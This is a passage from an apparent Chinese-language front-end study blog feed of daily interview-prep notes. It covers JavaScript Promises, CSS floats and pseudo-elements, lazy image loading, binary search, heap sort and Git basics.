class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">            setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                resolve()</span><br><span class="line">            &#125;,<span class="number">1000</span>)</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">            setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                resolve()</span><br><span class="line">            &#125;,<span class="number">1000</span>)</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>解决办法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">               setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                   resolve()</span><br><span class="line">               &#125;,<span class="number">1000</span>)</span><br><span class="line">           &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="built_in">console</span>.log(<span class="string">"1"</span>)</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;</span><br><span class="line">       setInterval(p,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h2 id="10-清除浮动"><a href="#10-清除浮动" class="headerlink" title="10.清除浮动"></a>10.清除浮动</h2><ul><li><h4 id="父级添加overflow-hidden；"><a href="#父级添加overflow-hidden；" class="headerlink" title="父级添加overflow: hidden；"></a>父级添加overflow: hidden；</h4></li><li><h4 id="通过属性clear-both-达到清除浮动的目的"><a href="#通过属性clear-both-达到清除浮动的目的" class="headerlink" title="通过属性clear:both;达到清除浮动的目的"></a>通过属性clear:both;达到清除浮动的目的</h4></li></ul><p>元素浮动后，只需要在浮动元素添加多一个块级元素，并添加clear: both;属性，便可以达到清除浮动的目的。 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"clear: both;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="通过给父级元素添加伪类after，达到清除浮动的目的；"><a href="#通过给父级元素添加伪类after，达到清除浮动的目的；" class="headerlink" title="通过给父级元素添加伪类after，达到清除浮动的目的；"></a>通过给父级元素添加伪类after，达到清除浮动的目的；</h4></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div1</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">            <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">            <span class="attribute">display</span>: block;</span><br><span class="line">            <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-堆排序"><a href="#11-堆排序" class="headerlink" title="11.堆排序"></a>11.堆排序</h2><p>堆排序是一种树形选择排序方法，将L[1…N]视为一棵完全二叉树的结构。</p><p>小根堆：<code>L[i]&lt;=L[2i]且L[i]&lt;=L[2i+1]</code></p><p>大根堆：<code>L[i]&gt;=L[2i]且L[i]&gt;=L[2i+1]</code></p><p>堆排序的关键是构造初始堆，对第[n/2]的结点进行筛选调整，依次筛选到1结点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//建立大根堆</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BulidMaxHeap</span>(<span class="params">arr,len</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=len/<span class="number">2</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        AdjustDown(arr,i,len)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AdjustDown</span>(<span class="params">arr,k,len</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建成初始堆后，输出堆顶元素，然后通常将堆底元素送入堆顶，继续调整。</p><p>时间复杂度O(log2n)，不稳定</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.30</title>
      <link href="2020/03/30/%E6%97%A5%E5%B8%B8-2020.3.30/"/>
      <url>2020/03/30/%E6%97%A5%E5%B8%B8-2020.3.30/</url>
      
        <content type="html"><![CDATA[<ul><li>伪类和伪元素</li><li>变量提升的一道题</li><li>正则将手机号中间四位变为*</li><li>图片懒加载</li><li>二分查找</li><li>移动端字体如何配置</li></ul><a id="more"></a><h2 id="1-伪类和伪元素"><a href="#1-伪类和伪元素" class="headerlink" title="1.伪类和伪元素"></a>1.伪类和伪元素</h2><p>伪类：<code>:focus</code>,<code>:hover</code>以及<code>&lt;a&gt;</code>标签的<code>:link</code>、<code>visited</code>等，</p><p>伪元素：较常见的比如<code>:before</code>、<code>:after</code>等。 </p><p><strong>（1）伪类的功能</strong></p><p>1.获取不存在与DOM树中的信息 。比如： <code>&lt;a&gt;</code> 标签的<code>:link、:visited</code> 等。这些信息不存在于DOM树中。</p><p>2.获取 不能被常规CSS选择器获取到的信息。比如：要获取第一个子元素，我们无法用常规的CSS选择器获取，但可以通过 <code>:first-child</code> 来获取到。</p><blockquote><p> <strong>伪类其实是弥补了CSS选择器的不足，用来更方便地获取信息。</strong> </p></blockquote><p> <strong>（2）伪元素的功能</strong></p><blockquote><p><strong>而伪元素本质上是创建了一个虚拟容器(元素)，我们可以在其中添加内容或样式。</strong> </p></blockquote><p><strong>（3）冒号区别</strong></p><blockquote><p>伪元素的由<strong>两个冒号</strong><code>::</code>开头，然后是伪元素的名称。</p></blockquote><blockquote><p>使用两个冒号<code>::</code>是为了区别伪类和伪元素（CSS2中并没有区别）。当然，考虑到兼容性，CSS2中已存的伪元素仍然可以使用一个冒号<code>:</code>的语法，但是CSS3中新增的伪元素必须使用两个冒号<code>::</code></p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div:after</span><br><span class="line">div::after</span><br><span class="line">div:first-child</span><br><span class="line">div::first-child //错</span><br></pre></td></tr></table></figure><h2 id="2-变量提升的一道题"><a href="#2-变量提升的一道题" class="headerlink" title="2. 变量提升的一道题"></a>2. 变量提升的一道题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'1'</span>, a));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve()).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'2'</span>, a));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'3'</span>, a);</span><br><span class="line">        <span class="keyword">var</span> a = <span class="string">'哈哈'</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'4'</span>, a);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3,f</span></span><br><span class="line"><span class="comment">//4,哈哈</span></span><br><span class="line"><span class="comment">//2，哈哈</span></span><br><span class="line"><span class="comment">//1，哈哈</span></span><br></pre></td></tr></table></figure><h2 id="3-正则将手机号中间四位变为"><a href="#3-正则将手机号中间四位变为" class="headerlink" title="3.正则将手机号中间四位变为*"></a>3.正则将手机号中间四位变为*</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replacePhone</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> reg = <span class="regexp">/^(\d&#123;3&#125;)(\d&#123;4&#125;)(\d&#123;4&#125;)$/</span></span><br><span class="line">   <span class="keyword">return</span>  str.replace(reg,<span class="string">'$1****$3'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-图片懒加载"><a href="#4-图片懒加载" class="headerlink" title="4. 图片懒加载"></a>4. 图片懒加载</h2><p>一张图片就是一个<img>标签，而图片的来源主要是src属性。浏览器是否发起亲求就是根据是否有src属性决定的。</p><p>既然这样，那么我们就要对<img>标签的src属性下手了，在没进入可视区域的时候，我们先不给这个<img>标签赋src属性，这样岂不是浏览器就不会发送请求了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.documentElement.clientHeight//获取屏幕可视区域的高度</span><br><span class="line">element.offsetTop//获取元素相对于文档顶部的高度</span><br><span class="line">document.documentElement.scrollTop//获取浏览器窗口顶部与文档顶部之间的距离，也就是滚动条滚动的距离</span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/80/v2-af1ab0c5f34e468e8647135c1f9f51e4_720w.jpg" alt="1"></p><p>如果：offsetTop-scroolTop&lt;clientHeight，则图片进入了可视区内，则被请求。 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>图片懒加载<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        img &#123;</span></span><br><span class="line"><span class="undefined">            display: block;</span></span><br><span class="line"><span class="undefined">            width: 100%;</span></span><br><span class="line"><span class="undefined">            height: 300px;</span></span><br><span class="line"><span class="undefined">            margin-bottom: 20px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/1.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/2.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/3.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/4.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/5.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/6.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/7.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/8.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/9.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/10.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/1.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"./images/2.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> imgs = <span class="built_in">document</span>.querySelectorAll(<span class="string">'img'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//offsetTop是元素与offsetParent的距离，循环获取直到页面顶部</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">getTop</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> T = e.offsetTop;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span>(e = e.offsetParent) &#123;</span></span><br><span class="line"><span class="undefined">                T += e.offsetTop;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> T;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">lazyLoad</span>(<span class="params">imgs</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> H = <span class="built_in">document</span>.documentElement.clientHeight;<span class="comment">//获取可视区域高度</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> S = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; imgs.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (H &gt; getTop(imgs[i])-S) &#123;</span></span><br><span class="line"><span class="javascript">                    imgs[i].src = imgs[i].getAttribute(<span class="string">'data-src'</span>);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//onscroll()在滚动条滚动的时候触发</span></span></span><br><span class="line"><span class="undefined">            lazyLoad(imgs);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="5-二分查找"><a href="#5-二分查找" class="headerlink" title="5. 二分查找"></a>5. 二分查找</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binary_search</span>(<span class="params">arr, key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> low = <span class="number">0</span>,</span><br><span class="line">        high = arr.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        <span class="keyword">var</span> mid = <span class="built_in">parseInt</span>((high + low) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (key == arr[mid]) &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; arr[mid]) &#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; arr[mid]) &#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.29</title>
      <link href="2020/03/29/%E6%97%A5%E5%B8%B8-2020.3.29/"/>
      <url>2020/03/29/%E6%97%A5%E5%B8%B8-2020.3.29/</url>
      
        <content type="html"><![CDATA[<ul><li>git详细教程</li><li>css可继承的属性</li><li>如何阻止冒泡和默认事件</li></ul><a id="more"></a><h2 id="1-git"><a href="#1-git" class="headerlink" title="1.git"></a>1.git</h2><h3 id="为什么要版本控制"><a href="#为什么要版本控制" class="headerlink" title="为什么要版本控制"></a>为什么要版本控制</h3><p>有了它你就可以将某个文件回溯到之前的状态，甚至将整个项目都回退到过去某个时间点的状态，你可以比较文件的变化细节，查出最后是谁修改了哪个地方，从而找出导致怪异问题出现的原因，又是谁在何时报告了某个功能缺陷等等。</p><h3 id="本地版本控制系统"><a href="#本地版本控制系统" class="headerlink" title="本地版本控制系统"></a>本地版本控制系统</h3><p>许多人习惯用复制整个项目目录的方式来保存不同的版本，或许还会改名加上备份时间以示区别。 这么做唯一的好处就是简单，但是特别容易犯错。</p><h3 id="集中化的版本控制系统"><a href="#集中化的版本控制系统" class="headerlink" title="集中化的版本控制系统"></a>集中化的版本控制系统</h3><p>接下来人们又遇到一个问题，如何让在不同系统上的开发者协同工作？ 于是，集中化的版本控制系统应运而生。</p><p>集中化的版本控制系统都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。下图来源于Git官网。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9TySunhaicSGCZFlichCE4c6ias2LkozP3b421lkjGWQjPXwnktoyrCzdiaqHNKdW8ppf3ZfiaW6NickCT6Q/640?wx_fmt=png" alt="1"></p><ul><li><strong>单点故障：</strong>中央服务器宕机，则其他人无法使用；如果中心数据库磁盘损坏有没有进行备份，你将丢失所有数据。本地版本控制系统也存在类似问题，只要整个项目的历史记录被保存在单一位置，就有丢失所有历史更新记录的风险。</li><li><strong>必须联网才能工作：</strong>受网络状况、带宽影响。 </li></ul><h3 id="分布式版本控制系统"><a href="#分布式版本控制系统" class="headerlink" title="分布式版本控制系统"></a>分布式版本控制系统</h3><p>Git 就是一个典型的分布式版本控制系统。 </p><p>这类系统，客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。 这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。 </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9TySunhaicSGCZFlichCE4c6iasu7ulWCbT9AIQCN0UibBejdI5rJcWFjfkGsUwV080MIlA17O0MhFxyBg/640?wx_fmt=png&quot; data-type=&quot;png" alt="2"></p><p>大部分版本控制系统（CVS、Subversion、Perforce、Bazaar 等等）都是以文件变更列表的方式存储信息，这类系统<strong>将它们保存的信息看作是一组基本文件和每个文件随时间逐步累积的差异。</strong> </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9TySunhaicSGCZFlichCE4c6iasA0lyBxS4ibGYhZ3AWw18xcdD92ublSms70ROlRApcBYALEQaQo4icltw/640?wx_fmt=png&quot; data-type=&quot;png" alt="3"></p><p>缺点：比如我们的增量特别特别多的话，如果我们要得到最终的文件会耗费时间和性能。 </p><p>反之，Git 更像是把数据看作是对小型文件系统的一组快照。 每次你提交更新，或在 Git 中保存项目状态时，它主要对当时的全部文件制作一个快照并保存这个快照的索引。 为了高效，如果文件没有修改，Git 不再重新存储该文件，而是只保留一个链接指向之前存储的文件。 Git 对待数据更像是一个 <strong>快照流</strong>。下图来源于Git官网。 </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9TySunhaicSGCZFlichCE4c6iasmXU6p4NrbyxmaFfibia3jbFrGve2n2XiaFHBnvRogBr7b4Iy9bwAibVrqA/640?wx_fmt=png&quot; data-type=&quot;png" alt="4"></p><p><strong>快照是什么</strong></p><blockquote><p>Every time you commit, or save the state of your project in Git, it basically takes a picture of what all your files look like at that moment and stores a reference to that snapshot. </p></blockquote><h3 id="Git-的三种状态"><a href="#Git-的三种状态" class="headerlink" title="Git 的三种状态"></a>Git 的三种状态</h3><p>Git 有三种状态，你的文件可能处于其中之一：</p><ul><li><strong>已提交（committed）</strong>：数据已经安全的保存在本地数据库中。</li><li><strong>已修改（modified）</strong>：已修改表示修改了文件，但还没保存到数据库中。</li><li><strong>已暂存（staged）</strong>：表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。</li></ul><p>由此引入 Git 项目的三个工作区域的概念：</p><ul><li><strong>Git 仓库(.git directoty) </strong></li><li><strong>工作目录(Working Directory)</strong> </li><li><strong>暂存区域(Staging Area)</strong> </li></ul><h4 id="基本的-Git-工作流程如下："><a href="#基本的-Git-工作流程如下：" class="headerlink" title="基本的 Git 工作流程如下："></a>基本的 Git 工作流程如下：</h4><ul><li>在工作目录中修改文件。</li><li>暂存文件，将文件的快照放入暂存区域。</li><li>提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录</li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/eZzl4LXykQwdIze8xZ74YQ859KfNjHG5nUDXtex9picV9oNnrL3oiaqNAMtfu9M8ibjFasp6doRoCQVAjOlibgA2nA/640?wx_fmt=jpeg" alt="5"></p><ul><li>Workspace：工作区</li><li>Index / Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul><h3 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h3><p>有两种取得 Git 项目仓库的方法。</p><ul><li>在现有目录中初始化仓库: 进入项目目录运行 <code>git init</code> 命令,该命令将创建一个名为 <code>.git</code> 的子目录。</li><li>从一个服务器克隆一个现有的 Git 仓库: <code>git clone [url]</code> 自定义本地仓库的名字: <code>git clone [url]</code> directoryname</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jinjingxuan/A-moving-note.git</span><br></pre></td></tr></table></figure><h2 id="2-CSS可继承的属性"><a href="#2-CSS可继承的属性" class="headerlink" title="2.CSS可继承的属性"></a>2.CSS可继承的属性</h2><h3 id="（1）字体系列属性"><a href="#（1）字体系列属性" class="headerlink" title="（1）字体系列属性"></a>（1）字体系列属性</h3><p>　　font-family：字体系列</p><p>　　font-weight：字体的粗细</p><p>　　font-size：字体的大小</p><p>　　font-style：字体的风格</p><h3 id="2）文本系列属性"><a href="#2）文本系列属性" class="headerlink" title="(2）文本系列属性"></a>(2）文本系列属性</h3><p>　　text-indent：文本缩进</p><p>　　text-align：文本水平对齐</p><p>　　line-height：行高</p><p>　　word-spacing：单词之间的间距</p><p>　　letter-spacing：中文或者字母之间的间距</p><p>　　text-transform：控制文本大小写（就是uppercase、lowercase、capitalize这三个）</p><p>　　color：文本颜色</p><h3 id="（3）元素可见性："><a href="#（3）元素可见性：" class="headerlink" title="（3）元素可见性："></a>（3）元素可见性：</h3><p>　　visibility：控制元素显示隐藏</p><h3 id="4-列表布局属性："><a href="#4-列表布局属性：" class="headerlink" title="(4)  列表布局属性："></a>(4)  列表布局属性：</h3><p>　　list-style：列表风格，包括list-style-type、list-style-image等</p><h3 id="5-光标属性："><a href="#5-光标属性：" class="headerlink" title="　　   (5)  光标属性："></a>　　   (5)  光标属性：</h3><p>　　cursor：光标显示为何种形态</p><h2 id="3-如何阻止冒泡和默认事件"><a href="#3-如何阻止冒泡和默认事件" class="headerlink" title="3.如何阻止冒泡和默认事件"></a>3.如何阻止冒泡和默认事件</h2><p>什么是冒泡事件？如在一个按钮是绑定一个”click”事件，那么”click”事件会依次在它的父级元素中被触发 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'div'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>test<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 